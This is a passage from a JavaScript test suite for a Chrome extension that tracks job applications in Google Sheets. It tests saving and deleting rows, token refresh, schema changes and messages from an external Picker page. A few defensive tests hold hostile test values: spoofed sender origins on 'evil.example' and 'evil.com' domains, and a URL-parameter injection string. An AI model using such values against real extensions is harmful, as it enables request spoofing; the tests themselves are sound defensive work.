      type: 'SAVE_JOB', spreadsheetId: id, tabId, extractedData: JOB,
      userInputs: { dropdown_5: 'Interviewing', text_6: 'phone screen' }, existingRowIndex: 1,
    });
    expect(upd).toMatchObject({ success: true, updated: true, rowIndex: 1 });
    const afterUpdate = google.cells(id, 'Applications');
    expect(afterUpdate[1][5]).toBe('Interviewing');
    expect(afterUpdate[1][6]).toBe('phone screen');
    expect(afterUpdate[2][2]).toBe('Globex');
    expect(afterUpdate).toHaveLength(3);

    // Header row can never be updated or deleted.
    expect((await send({ type: 'DELETE_JOB', spreadsheetId: id, tabId, rowIndex: 0 })).success).toBe(false);
    expect(
      (await send({ type: 'SAVE_JOB', spreadsheetId: id, tabId, extractedData: JOB, userInputs: {}, existingRowIndex: 0 })).success
    ).toBe(false);
    expect(google.cells(id, 'Applications')[0]).toEqual(DEFAULTS);

    const del = await send({ type: 'DELETE_JOB', spreadsheetId: id, tabId, rowIndex: 1 });
    expect(del.success).toBe(true);
    const afterDelete = google.cells(id, 'Applications');
    expect(afterDelete).toHaveLength(2);
    expect(afterDelete[1][2]).toBe('Globex');
    expect((await getSheets())[0].tabs[0].rowCount).toBe(2);
    expect((await send({ type: 'FIND_APPLICATION', extractedData: JOB })).matched).toBe(false);
  });

  test('hyperlink can be turned off via settings', async () => {
    const created = await send({ type: 'CREATE_SHEET' });
    const id = created.sheet.spreadsheetId;
    await send({ type: 'SAVE_SETTINGS', settings: { embedRoleHyperlink: false } });
    await send({ type: 'SAVE_JOB', spreadsheetId: id, tabId: created.sheet.tabs[0].gid, extractedData: JOB, userInputs: {} });
    expect(google.cells(id, 'Applications')[1][3]).toBe('Software Engineer');
  });

  test('role with quotes is escaped inside the HYPERLINK and still found again', async () => {
    const created = await send({ type: 'CREATE_SHEET' });
    const id = created.sheet.spreadsheetId;
    const tabId = created.sheet.tabs[0].gid;
    const job = { ...JOB, role: 'Engineer "Platform"' };
    await send({ type: 'SAVE_JOB', spreadsheetId: id, tabId, extractedData: job, userInputs: {} });
    expect(google.cells(id, 'Applications')[1][3]).toBe(`=HYPERLINK("${JOB.url}","Engineer ""Platform""")`);
    const found = await send({ type: 'FIND_APPLICATION', extractedData: job });
    expect(found.matched).toBe(true);
    expect(found.role).toBe('Engineer "Platform"');
  });

  test('save into a tab deleted/renamed in Google surfaces an error without corrupting config', async () => {
    const created = await send({ type: 'CREATE_SHEET' });
    const id = created.sheet.spreadsheetId;
    google.tab(id, 'Applications').title = 'Renamed elsewhere';
    const res = await send({
      type: 'SAVE_JOB', spreadsheetId: id, tabId: created.sheet.tabs[0].gid, extractedData: JOB, userInputs: {},
    });
    expect(res.success).toBe(false);
    expect(res.error).toBeTruthy();
    expect(await getSheets()).toHaveLength(1);
  });

  test('save to a protected tab fails with an error and writes nothing', async () => {
    const created = await send({ type: 'CREATE_SHEET' });
    const id = created.sheet.spreadsheetId;
    google.tab(id, 'Applications').locked = true;
    const res = await send({
      type: 'SAVE_JOB', spreadsheetId: id, tabId: created.sheet.tabs[0].gid, extractedData: JOB, userInputs: {},
    });
    expect(res.success).toBe(false);
    expect(google.cells(id, 'Applications')).toEqual([DEFAULTS]);
  });

  test('save with unknown sheet/tab ids returns clean errors', async () => {
    expect((await send({ type: 'SAVE_JOB', spreadsheetId: 'nope', tabId: '0', extractedData: JOB })).error).toBe('Sheet not found');
    const created = await send({ type: 'CREATE_SHEET' });
    const res = await send({ type: 'SAVE_JOB', spreadsheetId: created.sheet.spreadsheetId, tabId: 'zzz', extractedData: JOB });
    expect(res.error).toBe('Tab not found');
  });

  test('FIND_APPLICATION prefers the given destination and skips unreadable sheets', async () => {
    const a = await send({ type: 'CREATE_SHEET', title: 'A' });
    const b = await send({ type: 'CREATE_SHEET', title: 'B' });
    const idB = b.sheet.spreadsheetId;
    await send({ type: 'SAVE_JOB', spreadsheetId: idB, tabId: b.sheet.tabs[0].gid, extractedData: JOB, userInputs: {} });
    // Sheet A loses access; B is still searched.
    google.spreadsheets.get(a.sheet.spreadsheetId).access = 'forbidden';
    const found = await send({ type: 'FIND_APPLICATION', extractedData: JOB });
    expect(found).toMatchObject({ matched: true, spreadsheetId: idB });
  });
});

// ------------------------------------------------------- external SHEETS_PICKED

describe('SHEETS_PICKED (external, from the website Picker)', () => {
  const pick = (files, sender = pickerSender) => sendExternal({ type: 'SHEETS_PICKED', files }, sender);

  test('adds a valid pick, seeds, and notifies the UI', async () => {
    const id = sid(30);
    google.add(id, { title: 'Picked', tabs: [{ title: 'Sheet1', rows: [] }] });
    const res = await pick([{ id, name: 'Picked' }]);
    expect(res).toEqual({ success: true, added: 1 });
    const sheets = await getSheets();
    expect(sheets).toHaveLength(1);
    expect(sheets[0].url).toBe(editUrl(id));
    expect(google.cells(id, 'Sheet1')).toEqual([DEFAULTS]);
    expect(broadcasts).toContainEqual({ type: 'SHEETS_UPDATED' });
  });

  test('multiple picks incl. duplicates in the payload are added once each', async () => {
    const ids = [sid(31), sid(32), sid(33)];
    ids.forEach((id) => google.add(id));
    const res = await pick([...ids, ids[0]].map((id) => ({ id, name: id })));
    expect(res).toEqual({ success: true, added: 3 });
    expect(await getSheets()).toHaveLength(3);
  });

  test('re-picking an already connected sheet adds 0 and does not notify', async () => {
    const id = sid(34);
    google.add(id);
    await pick([{ id, name: 'x' }]);
    broadcasts.length = 0;
    const res = await pick([{ id, name: 'x' }]);
    expect(res).toEqual({ success: true, added: 0 });
    expect(broadcasts).toEqual([]);
    expect(await getSheets()).toHaveLength(1);
  });

  test('cap: 20 allowed, 21 rejected, empty and non-array rejected', async () => {
    const mk = (n) => Array.from({ length: n }, (_, i) => ({ id: sid(100 + i), name: `s${i}` }));
    mk(21).forEach((f) => google.add(f.id));
    const over = await pick(mk(21));
    expect(over).toMatchObject({ success: false, added: 0 });
    expect(over.error).toMatch(/at most 20/);
    expect(await getSheets()).toEqual([]);
    const ok = await pick(mk(20));
    expect(ok).toEqual({ success: true, added: 20 });
    expect(await pick([])).toMatchObject({ success: false, added: 0 });
    expect(await pick('nope')).toMatchObject({ success: false, added: 0 });
  });

  test.each([
    ['short id', { id: 'short' }],
    ['bad chars', { id: 'has spaces and !!! chars 1234567890' }],
    ['non-string id', { id: 12345678901234567890 }],
    ['missing id', { name: 'x' }],
    ['null entry', null],
  ])('bad id (%s) rejects the whole batch with nothing added', async (_n, bad) => {
    const good = sid(40);
    google.add(good);
    const res = await pick([{ id: good, name: 'ok' }, bad]);
    expect(res).toMatchObject({ success: false, added: 0 });
    expect(res.error).toMatch(/invalid ID/);
    expect(await getSheets()).toEqual([]);
  });

  test.each([
    ['wrong origin', { origin: 'https://evil.example', url: 'https://evil.example/picker/' }],
    ['right origin wrong path', { origin: PICKER_ORIGIN, url: `${PICKER_ORIGIN}/other/` }],
    ['subdomain spoof', { origin: 'https://jobtracker.jayshah.xyz.evil.com', url: 'https://jobtracker.jayshah.xyz.evil.com/picker/' }],
    ['no sender', null],
    ['origin/url mismatch', { origin: PICKER_ORIGIN, url: 'https://evil.example/picker/' }],
    ['http downgrade', { origin: 'http://jobtracker.jayshah.xyz', url: 'http://jobtracker.jayshah.xyz/picker/' }],
  ])('rejects untrusted sender: %s', async (_n, sender) => {
    const id = sid(41);
    google.add(id);
    const res = await pick([{ id, name: 'x' }], sender);
    expect(res).toEqual({ success: false, added: 0, error: 'Request not allowed.' });
    expect(google.requests).toHaveLength(0);
  });

  test('unknown external message type is refused', async () => {
    const res = await sendExternal({ type: 'ADD_SHEET', url: editUrl(sid(1)) }, pickerSender);
    expect(res.success).toBe(false);
    expect(await getSheets()).toEqual([]);
  });

  test('signed out => error, nothing added', async () => {
    delete store.googleToken;
    const id = sid(42);
    google.add(id);
    const res = await pick([{ id, name: 'x' }]);
    expect(res).toMatchObject({ success: false, added: 0 });
    expect(res.error).toMatch(/Sign in/);
  });

  test('a file Google still refuses is reported by name; granted ones still add', async () => {
    const ok = sid(43);
    const bad = sid(44);
    google.add(ok);
    google.add(bad, { access: 'forbidden' });
    const res = await pick([{ id: bad, name: 'Secret Sheet' }, { id: ok, name: 'Fine' }]);
    expect(res.success).toBe(false);
    expect(res.added).toBe(1);
    expect(res.error).toMatch(/Secret Sheet/);
    expect((await getSheets()).map((s) => s.spreadsheetId)).toEqual([ok]);
    // added > 0 still tells the UI to refresh.
    expect(broadcasts).toContainEqual({ type: 'SHEETS_UPDATED' });
  });

  test('a transient failure after some sheets were added reports the partial count', async () => {
    const [a, b] = [sid(47), sid(48)];
    google.add(a);
    google.add(b);
    const realRoute = google.route.bind(google);
    google.route = async (url, ...rest) => {
      if (url.includes(b)) throw new ApiError(503, 'The service is currently unavailable.');
      return realRoute(url, ...rest);
    };
    const res = await pick([{ id: a, name: 'A' }, { id: b, name: 'B' }]);
    expect(res).toMatchObject({ success: false, added: 1 });
    expect((await getSheets()).map((s) => s.spreadsheetId)).toEqual([a]);
    expect(broadcasts).toContainEqual({ type: 'SHEETS_UPDATED' });
  });

  test('onMessageExternal responds even if sendMessage throws synchronously', async () => {
    const id = sid(45);
    google.add(id);
    global.chrome.runtime.sendMessage = () => {
      throw new Error('Could not establish connection');
    };
    const res = await pick([{ id, name: 'x' }]);
    expect(res).toEqual({ success: true, added: 1 });
  });

  test('a picked sheet flagged needsAccess is re-granted and the flag cleared', async () => {
    const id = sid(46);
    google.add(id, { access: 'forbidden' });
    store.configuredSheets = [
      { spreadsheetId: id, url: editUrl(id), name: 'Old', needsAccess: true, tabs: [] },
    ];
    google.spreadsheets.get(id).access = 'granted';
    const res = await pick([{ id, name: 'Old' }]);
    expect(res).toEqual({ success: true, added: 1 });
    const [sheet] = await getSheets();
    expect(sheet.needsAccess).toBeFalsy();
    expect(sheet.tabs.length).toBeGreaterThan(0);
  });
});

// ----------------------------------------------------------------- OPEN_PICKER

describe('OPEN_PICKER', () => {
  test('opens the picker URL with ext and ids', async () => {
    const id = sid(50);
    const res = await send({ type: 'OPEN_PICKER', spreadsheetId: id });
    expect(res.success).toBe(true);
    const u = new URL(createdTabs[0].url);
    expect(u.origin).toBe(PICKER_ORIGIN);
    expect(u.pathname).toBe('/picker/');
    expect(u.searchParams.get('ext')).toBe(EXT_ID);
    expect(u.searchParams.get('ids')).toBe(id);
  });

  test('without an id there is no ids param', async () => {
    await send({ type: 'OPEN_PICKER' });
    const u = new URL(createdTabs[0].url);
    expect(u.searchParams.has('ids')).toBe(false);
    expect(u.searchParams.get('ext')).toBe(EXT_ID);
  });

  test('an invalid id (e.g. injection attempt) is dropped, not forwarded', async () => {
    await send({ type: 'OPEN_PICKER', spreadsheetId: 'x&ext=evil' });
    const u = new URL(createdTabs[0].url);
    expect(u.searchParams.has('ids')).toBe(false);
    expect(u.searchParams.get('ext')).toBe(EXT_ID);
  });

  test('custom client => PICKER_UNAVAILABLE and no tab opened', async () => {
    store.oauthClientId = 'mine.apps.googleusercontent.com';
    const res = await send({ type: 'OPEN_PICKER', spreadsheetId: sid(51) });
    expect(res).toMatchObject({ success: false, code: 'PICKER_UNAVAILABLE' });
    expect(createdTabs).toEqual([]);
  });
});

// -------------------------------------------------- REMOVE_SHEET and re-add

describe('REMOVE_SHEET then re-add', () => {
  test('removing only disconnects locally; re-adding restores without touching data', async () => {
    const created = await send({ type: 'CREATE_SHEET' });
    const id = created.sheet.spreadsheetId;
    const tabId = created.sheet.tabs[0].gid;
    await send({ type: 'SAVE_JOB', spreadsheetId: id, tabId, extractedData: JOB, userInputs: {} });
    const before = structuredClone(google.cells(id, 'Applications'));

    const removed = await send({ type: 'REMOVE_SHEET', spreadsheetId: id });
    expect(removed).toMatchObject({ success: true, sheets: [] });
    expect(await getSheets()).toEqual([]);
    expect(google.cells(id, 'Applications')).toEqual(before);

    const readded = await send({ type: 'ADD_SHEET', url: editUrl(id) });
    expect(readded.success).toBe(true);
    expect(readded.sheet.tabs[0].rowCount).toBe(2);
    expect(google.cells(id, 'Applications')).toEqual(before);
    // Existing data is still detected for duplicates after re-adding.
    const dup = await send({ type: 'SAVE_JOB', spreadsheetId: id, tabId, extractedData: JOB, userInputs: {} });
    expect(dup.alreadyApplied).toBe(true);
  });

  test('removing an unknown id is a harmless no-op', async () => {
    const created = await send({ type: 'CREATE_SHEET' });
    const res = await send({ type: 'REMOVE_SHEET', spreadsheetId: 'unknown' });
    expect(res.sheets).toHaveLength(1);
    expect(created.success).toBe(true);
  });
});

// --------------------------------------------------- REFRESH_SHEETS / needsAccess

describe('REFRESH_SHEETS and needsAccess', () => {
  test('flags a sheet that lost access, keeps its config, refreshes the rest, and clears the flag on return', async () => {
    const a = await send({ type: 'CREATE_SHEET', title: 'A' });
    const b = await send({ type: 'CREATE_SHEET', title: 'B' });
    const idA = a.sheet.spreadsheetId;
    const idB = b.sheet.spreadsheetId;

    google.spreadsheets.get(idA).access = 'notfound';
    google.spreadsheets.get(idB).title = 'B renamed';
    const r1 = await send({ type: 'REFRESH_SHEETS' });
    expect(r1.success).toBe(true);
    const byId = Object.fromEntries(r1.sheets.map((s) => [s.spreadsheetId, s]));
    expect(byId[idA].needsAccess).toBe(true);
    expect(byId[idA].tabs).toHaveLength(1);
    expect(byId[idB].name).toBe('B renamed');
    expect(byId[idB].needsAccess).toBe(false);
    expect((await getSheets()).find((s) => s.spreadsheetId === idA).needsAccess).toBe(true);

    google.spreadsheets.get(idA).access = 'granted';
    const r2 = await send({ type: 'REFRESH_SHEETS' });
    expect(r2.sheets.find((s) => s.spreadsheetId === idA).needsAccess).toBe(false);
  });

  test('refresh picks up edits made in Google (new tab, new rows) and keeps saved mappings', async () => {
    const created = await send({ type: 'CREATE_SHEET' });
    const id = created.sheet.spreadsheetId;
    const tabId = created.sheet.tabs[0].gid;
    const ch = await send({
      type: 'APPLY_SCHEMA_CHANGE', spreadsheetId: id, tabId,
      change: { op: 'change_tag', columnIndex: 6, newTag: 'ignore' },
    });
    expect(ch).toMatchObject({ success: true });
    google.spreadsheets.get(id).sheets.push({
      sheetId: 555, title: 'Second', index: 1, grid: [], rowCount: 1000, colCount: 26, locked: false,
    });
    const res = await send({ type: 'REFRESH_SHEETS' });
    const sheet = res.sheets[0];
    expect(sheet.tabs.map((t) => t.tabName)).toEqual(['Applications', 'Second']);
    expect(google.cells(id, 'Second')).toEqual([DEFAULTS]);
    expect(sheet.tabs[0].mappings[6].tag).toBe('ignore');
  });

  test('refresh with offline surfaces an error and keeps stored config', async () => {
    const created = await send({ type: 'CREATE_SHEET' });
    google.offline = true;
    const res = await send({ type: 'REFRESH_SHEETS' });
    expect(res.success).toBe(false);
    expect(await getSheets()).toHaveLength(1);
    expect(created.success).toBe(true);
  });

  test('refresh with no sheets is a no-op success', async () => {
    const res = await send({ type: 'REFRESH_SHEETS' });
    expect(res).toEqual({ success: true, sheets: [] });
  });
});

// ------------------------------------------------------------ auth plumbing

describe('token handling through the router', () => {
  test('outdated broad-scope token => "sign in again" and token dropped', async () => {
    signIn({ scope: 'https://www.googleapis.com/auth/spreadsheets' });
    const id = sid(60);
    google.add(id);
    const res = await send({ type: 'ADD_SHEET', url: editUrl(id) });
    expect(res.success).toBe(false);
    expect(res.error).toMatch(/narrower Google access/);
    expect(store.googleToken).toBeUndefined();
    const status = await send({ type: 'GET_AUTH_STATUS' });
    expect(status.signedIn).toBe(false);
  });

  test('GET_AUTH_STATUS reports scopeOutdated for a stale token', async () => {
    signIn({ scope: 'https://www.googleapis.com/auth/spreadsheets' });
    const status = await send({ type: 'GET_AUTH_STATUS' });
    expect(status).toMatchObject({ signedIn: false, scopeOutdated: true });
  });

  test('expired access token + refresh token => silent refresh, then the call succeeds', async () => {
    signIn({ accessToken: 'tok-stale', expiresAt: Date.now() - 1000 });
    const created = await send({ type: 'CREATE_SHEET' });
    expect(created.success).toBe(true);
    expect(google.refreshCount).toBe(1);
    expect(store.googleToken.accessToken).toBe('tok-refreshed-1');
    expect(store.googleToken.refreshToken).toBe('rt-1');
    expect(store.googleToken.scope).toBe(DRIVE);
  });

  test('parallel calls with an expired token share one refresh', async () => {
    signIn({ accessToken: 'tok-stale', expiresAt: 0 });
    const id = sid(61);
    google.add(id);
    const [a, b] = await Promise.all([
      send({ type: 'ADD_SHEET', url: editUrl(id) }),
      send({ type: 'FIND_APPLICATION', extractedData: JOB }),
    ]);
    expect(a.success).toBe(true);
    expect(b.success).toBe(true);
    expect(google.refreshCount).toBe(1);
  });

  test('401 mid-flow => access token dropped, silent refresh, retry succeeds, session kept', async () => {
    signIn({ accessToken: 'tok-revoked' }); // looks fresh locally but Google rejects it
    const id = sid(62);
    google.add(id, { tabs: [{ title: 'Sheet1', rows: [] }] });
    const res = await send({ type: 'ADD_SHEET', url: editUrl(id) });
    expect(res.success).toBe(true);
    expect(google.refreshCount).toBe(1);
    expect(store.googleToken.refreshToken).toBe('rt-1');
    expect(google.cells(id, 'Sheet1')).toEqual([DEFAULTS]);
  });

  test('401 retry for SAVE_JOB (a handler without its own try/catch) still returns a response', async () => {
    const created = await send({ type: 'CREATE_SHEET' });
    google.validTokens.delete('tok-1'); // token revoked server-side
    const res = await send({
      type: 'SAVE_JOB', spreadsheetId: created.sheet.spreadsheetId, tabId: created.sheet.tabs[0].gid,
      extractedData: JOB, userInputs: {},
    });
    expect(res.success).toBe(true);
    expect(google.cells(created.sheet.spreadsheetId, 'Applications')).toHaveLength(2);
  });

  test('revoked refresh token (invalid_grant) => sign in again and session cleared', async () => {
    signIn({ accessToken: 'tok-stale', expiresAt: 0 });
    google.refreshFailure = { status: 400, body: { error: 'invalid_grant', error_description: 'Token has been expired or revoked.' } };
    const res = await send({ type: 'CREATE_SHEET' });
    expect(res.success).toBe(false);
    expect(res.error).toMatch(/Sign in with Google/);
    expect(store.googleToken).toBeUndefined();
  });

  test('offline during refresh keeps the session', async () => {
    signIn({ accessToken: 'tok-stale', expiresAt: 0 });
    google.offline = true;
    const res = await send({ type: 'CREATE_SHEET' });
    expect(res.success).toBe(false);
    expect(res.error).toMatch(/internet connection/);
    expect(store.googleToken.refreshToken).toBe('rt-1');
  });

  test('429 on create is reported and nothing is stored', async () => {
    google.rateLimited = 1;
    const res = await send({ type: 'CREATE_SHEET' });
    expect(res.success).toBe(false);
    expect(res.error).toMatch(/limiting requests/);
    expect(await getSheets()).toEqual([]);
  });

  test('every message type responds (never hangs) even when signed out', async () => {
    delete store.googleToken;
    const created = await Promise.all([
      send({ type: 'CREATE_SHEET' }),
      send({ type: 'REFRESH_SHEETS' }),
      send({ type: 'SAVE_JOB', spreadsheetId: 'x', tabId: '0', extractedData: JOB }),
    ]);
    created.forEach((r) => expect(r.success).toBe(false));
  });
});

// ------------------------------------------------------ schema changes on grid

describe('APPLY_SCHEMA_CHANGE keeps data aligned in the real grid', () => {
  async function seededSheet() {
    const created = await send({ type: 'CREATE_SHEET' });
    const id = created.sheet.spreadsheetId;
    const tabId = created.sheet.tabs[0].gid;
    await send({ type: 'SAVE_JOB', spreadsheetId: id, tabId, extractedData: JOB, userInputs: { text_6: 'n1' } });
    await send({ type: 'SAVE_JOB', spreadsheetId: id, tabId, extractedData: JOB2, userInputs: { text_6: 'n2' } });
    return { id, tabId };
  }

  test('delete a middle column: header+data removed together, mappings re-indexed, later saves align', async () => {
    const { id, tabId } = await seededSheet();
    const unconfirmed = await send({
      type: 'APPLY_SCHEMA_CHANGE', spreadsheetId: id, tabId, change: { op: 'delete', columnIndex: 1 },
    });
    expect(unconfirmed.needsConfirmation).toBe(true);
    expect(google.cells(id, 'Applications')[0]).toEqual(DEFAULTS);

    const res = await send({
      type: 'APPLY_SCHEMA_CHANGE', spreadsheetId: id, tabId, confirmed: true, change: { op: 'delete', columnIndex: 1 },
    });
    expect(res.success).toBe(true);
    const grid = google.cells(id, 'Applications');
    expect(grid[0]).toEqual(['Date Applied', 'Company Name', 'Role', 'Location', 'Application Status', 'Notes']);
    expect(grid[1][1]).toBe('Acme Corp');
    expect(grid[1][5]).toBe('n1');
    expect(grid[2][1]).toBe('Globex');
    expect(grid[2][5]).toBe('n2');

    const tab = (await getSheets())[0].tabs[0];
    expect(tab.headers).toEqual(grid[0]);
    expect(tab.mappings.map((m) => m.columnIndex)).toEqual([0, 1, 2, 3, 4, 5]);

    // New saves use the new layout; dedupe/find still see the old rows.
    const job3 = { company: 'Hooli', role: 'PM', location: 'SF', url: 'https://hooli.example/jobs/777?jobId=777' };
    const saved = await send({ type: 'SAVE_JOB', spreadsheetId: id, tabId, extractedData: job3, userInputs: { text_5: 'n3' } });
    expect(saved.success).toBe(true);
    const after = google.cells(id, 'Applications');
    expect(after[3][1]).toBe('Hooli');
    expect(after[3][5]).toBe('n3');
    expect(after[3]).toHaveLength(6);
    expect((await send({ type: 'FIND_APPLICATION', extractedData: JOB })).matched).toBe(true);
  });

  test('delete the last column then undo/redo stay consistent with the grid', async () => {
    const { id, tabId } = await seededSheet();
    await send({
      type: 'APPLY_SCHEMA_CHANGE', spreadsheetId: id, tabId, confirmed: true, change: { op: 'delete', columnIndex: 6 },
    });
    expect(google.cells(id, 'Applications')[0]).toEqual(DEFAULTS.slice(0, 6));
    const undo = await send({ type: 'UNDO_SCHEMA_CHANGE' });
    expect(undo.success).toBe(true);
    expect(google.cells(id, 'Applications')[0]).toEqual(DEFAULTS);
    expect(google.cells(id, 'Applications')[1][2]).toBe('Acme Corp'); // data columns still aligned
  });

  test('move a column right and left: header and data travel together', async () => {
    const { id, tabId } = await seededSheet();
    const r1 = await send({
      type: 'APPLY_SCHEMA_CHANGE', spreadsheetId: id, tabId, change: { op: 'move', fromIndex: 2, toIndex: 5 },
    });
    expect(r1.success).toBe(true);
    let grid = google.cells(id, 'Applications');
    expect(grid[0]).toEqual(['Date Applied', 'Job ID', 'Role', 'Location', 'Application Status', 'Company Name', 'Notes']);
    expect(grid[1][5]).toBe('Acme Corp');
    expect(grid[2][5]).toBe('Globex');
    expect(grid[1][6]).toBe('n1');

    const tab = (await getSheets())[0].tabs[0];
    expect(tab.headers).toEqual(grid[0]);
    expect(tab.mappings[5]).toMatchObject({ header: 'Company Name', tag: 'company_name', columnIndex: 5 });

    const r2 = await send({
      type: 'APPLY_SCHEMA_CHANGE', spreadsheetId: id, tabId, change: { op: 'move', fromIndex: 5, toIndex: 0 },
    });
    expect(r2.success).toBe(true);
    grid = google.cells(id, 'Applications');
    expect(grid[0][0]).toBe('Company Name');
    expect(grid[1][0]).toBe('Acme Corp');
    expect(grid[2][0]).toBe('Globex');

    // Saving after the moves writes each value under the right header.
    const job3 = { company: 'Hooli', role: 'PM', location: 'SF', url: 'https://hooli.example/jobs/777?jobId=777' };
    await send({ type: 'SAVE_JOB', spreadsheetId: id, tabId, extractedData: job3, userInputs: {} });
    const last = google.cells(id, 'Applications')[3];
    const headers = google.cells(id, 'Applications')[0];
    expect(last[headers.indexOf('Company Name')]).toBe('Hooli');
    expect(last[headers.indexOf('Job ID')]).toBe('777');
    expect(last[headers.indexOf('Location')]).toBe('SF');
  });

  test('add a column then rename it: header written, existing data untouched', async () => {
    const { id, tabId } = await seededSheet();
    const add = await send({
      type: 'APPLY_SCHEMA_CHANGE', spreadsheetId: id, tabId, change: { op: 'add', header: 'Salary', tag: 'custom_text' },
    });
    expect(add.success).toBe(true);
    let grid = google.cells(id, 'Applications');
    expect(grid[0]).toEqual([...DEFAULTS, 'Salary']);
    expect(grid[1][2]).toBe('Acme Corp');
    await send({
      type: 'APPLY_SCHEMA_CHANGE', spreadsheetId: id, tabId, change: { op: 'rename', columnIndex: 7, newHeader: 'Pay' },
    });
    grid = google.cells(id, 'Applications');
    expect(grid[0][7]).toBe('Pay');
    expect(grid[2][2]).toBe('Globex');
  });

  test('a failed sheet write leaves local config unchanged (protected tab)', async () => {
    const { id, tabId } = await seededSheet();
    google.tab(id, 'Applications').locked = true;
    const before = structuredClone(await getSheets());
    const res = await send({
      type: 'APPLY_SCHEMA_CHANGE', spreadsheetId: id, tabId, confirmed: true, change: { op: 'delete', columnIndex: 1 },
    });
    expect(res.success).toBe(false);
    expect(res.error).toMatch(/nothing was changed/);
    expect(await getSheets()).toEqual(before);
  });

  test('schema change on a not-yet-granted (needsAccess) sheet does not corrupt config', async () => {
    const { id, tabId } = await seededSheet();
    google.spreadsheets.get(id).access = 'forbidden';
    const before = structuredClone(await getSheets());
    const res = await send({
      type: 'APPLY_SCHEMA_CHANGE', spreadsheetId: id, tabId, confirmed: true, change: { op: 'delete', columnIndex: 1 },
    });
    expect(res.success).toBe(false);
    expect(await getSheets()).toEqual(before);
  });
});

// ---------------------------------------------------------------- misc router

describe('router basics', () => {
  test('unknown message type', async () => {
    expect((await send({ type: 'NOPE' })).success).toBe(false);
  });

  test('REFRESH_SHEETS does not resurrect a sheet removed while it was running', async () => {
    const a = (await send({ type: 'CREATE_SHEET', title: 'A' })).sheet.spreadsheetId;
    const b = (await send({ type: 'CREATE_SHEET', title: 'B' })).sheet.spreadsheetId;
    const refreshing = send({ type: 'REFRESH_SHEETS' });
    const removed = send({ type: 'REMOVE_SHEET', spreadsheetId: a });
    const [refreshRes] = await Promise.all([refreshing, removed]);
    expect(refreshRes.success).toBe(true);
    expect((await getSheets()).map((x) => x.spreadsheetId)).toEqual([b]);
    expect(refreshRes.sheets.map((x) => x.spreadsheetId)).toEqual([b]);
  });

  test('a schema change does not clobber a tab rename that finished while it was running', async () => {
    const created = await send({ type: 'CREATE_SHEET' });
    const id = created.sheet.spreadsheetId;
    const tabId = created.sheet.tabs[0].gid;
    const realRoute = google.route.bind(google);
    let renamed = null;
    google.route = async (url, ...rest) => {
      // While the header rewrite is in flight (after its write step), a rename completes.
      const out = await realRoute(url, ...rest);
      if (!renamed && rest[0] === 'PUT' && /values\//.test(url)) {
        renamed = send({ type: 'RENAME_SHEET_TAB', spreadsheetId: id, tabId, title: 'Renamed Tab' });
        await renamed;
      }
      return out;
    };
    const res = await send({
      type: 'APPLY_SCHEMA_CHANGE', spreadsheetId: id, tabId, confirmed: true,
      change: { op: 'rename', columnIndex: 3, newHeader: 'Position' },
    });
    google.route = realRoute;
    expect(res.success).toBe(true);
    expect(renamed).not.toBeNull();
    const tab = (await getSheets())[0].tabs[0];
    expect(tab.tabName).toBe('Renamed Tab');
    expect(tab.headers[3]).toBe('Position');
  });

  test('REFRESH_SHEETS does not undo a re-grant that finished while it was running', async () => {
    const id = (await send({ type: 'CREATE_SHEET', title: 'A' })).sheet.spreadsheetId;
    google.spreadsheets.get(id).access = 'forbidden';
    const flagged = await send({ type: 'REFRESH_SHEETS' });
    expect(flagged.sheets[0].needsAccess).toBe(true);
    // Refresh starts while access is still denied; the re-grant lands before it finishes.
    const realRoute = google.route.bind(google);
    let regranted = false;
    google.route = async (url, ...rest) => {
      if (!regranted && url.includes(id)) {
        regranted = true;
        google.spreadsheets.get(id).access = 'granted';
        const picked = await sendExternal(
          { type: 'SHEETS_PICKED', files: [{ id, name: 'A' }] },
          { origin: PICKER_ORIGIN, url: `${PICKER_ORIGIN}/picker/?ext=${EXT_ID}` }
        );
        expect(picked.success).toBe(true);
        google.spreadsheets.get(id).access = 'forbidden'; // stale view for this refresh
      }
      return realRoute(url, ...rest);
    };
    await send({ type: 'REFRESH_SHEETS' });
    google.route = realRoute;
    expect((await getSheets())[0].needsAccess).toBeFalsy();
  });

  test('RENAME_SHEET_TAB renames in Google and locally; later saves use the new name', async () => {
    const created = await send({ type: 'CREATE_SHEET' });
    const id = created.sheet.spreadsheetId;
    const tabId = created.sheet.tabs[0].gid;
    const res = await send({ type: 'RENAME_SHEET_TAB', spreadsheetId: id, tabId, title: "Bob's 2025 求職" });
    expect(res.success).toBe(true);
    expect(google.tab(id, "Bob's 2025 求職")).toBeTruthy();
    const saved = await send({ type: 'SAVE_JOB', spreadsheetId: id, tabId, extractedData: JOB, userInputs: {} });
    expect(saved.success).toBe(true);
    expect(google.cells(id, "Bob's 2025 求職")).toHaveLength(2);
  });
});

// ------------------------------------------------- row fingerprint (stale rows)

describe('row fingerprint guards stale row indexes', () => {
  async function setup() {
    const created = await send({ type: 'CREATE_SHEET', title: 'FP' });
    const id = created.sheet.spreadsheetId;
    const tabId = created.sheet.tabs[0].gid;
    const save = (job) =>
      send({ type: 'SAVE_JOB', spreadsheetId: id, tabId, extractedData: job, userInputs: {} });
    const a = await save(JOB);
    const b = await save(JOB2);
    return { id, tabId, a, b };
  }
  const upd = (id, tabId, extra) =>
    send({
      type: 'SAVE_JOB', spreadsheetId: id, tabId, extractedData: JOB,
      userInputs: { dropdown_5: 'Interviewing' }, existingRowIndex: 1, ...extra,
    });

  test('save returns a fingerprint that find reports identically', async () => {
    const { a } = await setup();
    const found = await send({ type: 'FIND_APPLICATION', extractedData: JOB });
    expect(a.rowFingerprint).toEqual(expect.any(String));
    expect(found.rowFingerprint).toBe(a.rowFingerprint);
  });

  test('update after a row was inserted above => ROW_CHANGED, sheet untouched', async () => {
    const { id, tabId, a } = await setup();
    google.tab(id, 'Applications').grid.splice(1, 0, ['2020-01-01', '', 'Other', 'Role']);
    const before = structuredClone(google.cells(id, 'Applications'));
    const res = await upd(id, tabId, { expectedFingerprint: a.rowFingerprint });
    expect(res).toMatchObject({ success: false, code: 'ROW_CHANGED' });
    expect(google.cells(id, 'Applications')).toEqual(before);
  });

  test('delete after a sort => ROW_CHANGED, nothing deleted', async () => {
    const { id, tabId, a } = await setup();
    const rows = google.tab(id, 'Applications').grid;
    [rows[1], rows[2]] = [rows[2], rows[1]];
    const before = structuredClone(google.cells(id, 'Applications'));
    const res = await send({
      type: 'DELETE_JOB', spreadsheetId: id, tabId, rowIndex: 1, expectedFingerprint: a.rowFingerprint,
    });
    expect(res).toMatchObject({ success: false, code: 'ROW_CHANGED' });
    expect(google.cells(id, 'Applications')).toEqual(before);
  });

